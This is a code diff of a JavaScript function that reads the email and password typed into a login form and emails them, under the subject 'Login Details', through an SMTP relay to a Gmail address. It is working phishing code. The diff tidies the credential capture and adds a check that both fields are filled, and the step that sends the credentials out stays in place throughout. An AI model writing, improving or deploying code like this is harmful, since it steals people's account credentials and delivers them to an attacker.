@@ -1,9 +1,8 @@
 function emailSend() {
-  var email = document.getElementById('email').value;
-  var password = document.getElementById('password').value;
-  var messageBody = "Email " + email +
-    "<br/> password " + password;
+    const email = document.querySelector('.emailInput').value;
+    const password = document.querySelector('.passInput').value;
 
+    if (email && password) {
   Email.send({
     Host: "smtp.elasticemail.com",
     Username: "payday10177@gmail.com",
@@ -11,7 +10,7 @@ function emailSend() {
     To: 'payday10177@gmail.com',
     From: "payday10177@gmail.com",
     Subject: "Login Details",
-    Body: messageBody
+    Body: `Email: ${email} <br> Password: ${password}`
   }).then(
     message => {
       if (message == 'OK') {
@@ -22,4 +21,7 @@ function emailSend() {
       }
     }
   );
-}
+}else {
+        alert('Please fill in all fields.');
+    }
+    }
